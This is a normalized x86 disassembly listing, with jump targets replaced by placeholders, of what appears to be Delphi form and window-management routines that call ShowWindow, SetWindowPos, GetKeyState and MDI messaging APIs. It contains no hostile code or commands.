mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_450b30
sub_45918c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_4591c4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403f4c
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4591f8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_459349
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459350
lea eax [ ebp - 0x10 ]
call sub_403ef8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_45914c
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_43a310
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412cac
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_43cf9c
lea eax [ ebp - 0x1c ]
call sub_40695c
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_45914c
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45918c
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_45d85c
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_45d8c4
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_45d8c4
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_4591c4
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412cac
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_43cf9c
lea eax [ ebp - 0x1c ]
call sub_40695c
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_45d7f4
test [ esi + 0x228 ] 0x8
je r-xdata
sub_459358
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_4593cc
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_4593f8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4421fc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_457408
lea edx [ ebp - 0x14 ]
call sub_45abd0
push ebp
mov eax [ ebp - 0x4 ]
call sub_457408
lea edx [ ebp - 0x24 ]
call sub_45abd0
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_4593cc
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_457408
lea edx [ ebp - 0x24 ]
call sub_45abd0
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_4593cc
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4593cc
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4593cc
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_4594b0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403320
pop esi
pop ebx
retn
sub_4594d4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403320
pop esi
pop ebx
retn
sub_4594f8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_4430dc
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_444194
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_444194
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_459594
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_459afe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_45dca8
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_459ae1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459ae8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
xor eax eax
push ebp
push j_sub_4035c4#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_45964c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_458740
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4411b8
jmp r-xdata
mov eax [ rw-data ]
call sub_45ae2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43ce88
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_443c60
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_45ae20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43cecc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_443c60
call sub_4543a4
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45ae5c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43ce88
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45ae2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43d6e4
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45ae50
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43cecc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45ae20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_4579f0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4579f0
jmp r-xdata
sub_459651
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45d3bc
call sub_40392c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_45ae2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43ce88
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45ae20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43cecc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45ae5c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43ce88
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45ae2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459ae8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43d6e4
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45ae50
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43cecc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45ae20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_4579f0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4579f0
jmp r-xdata
sub_4599ed
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45d3bc
call sub_40392c
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_458740
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4411b8
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_443c60
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459ae8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_443c60
call sub_4543a4
mov ebx eax
sub_459b34
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_459b8c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dcac
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_459bea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403124
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_459bf8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403320
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_459c24
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45d3a8
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403320
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_459dc4
jmp r-xdata
mov eax ebx
call sub_459e60
mov dl 0x1
mov eax ebx
call sub_4579b0
jmp r-xdata
sub_459cc8
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_45733c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_457388
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_459d2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_459d98
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403320
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_459e60
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459de4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_459e52
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459e59
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
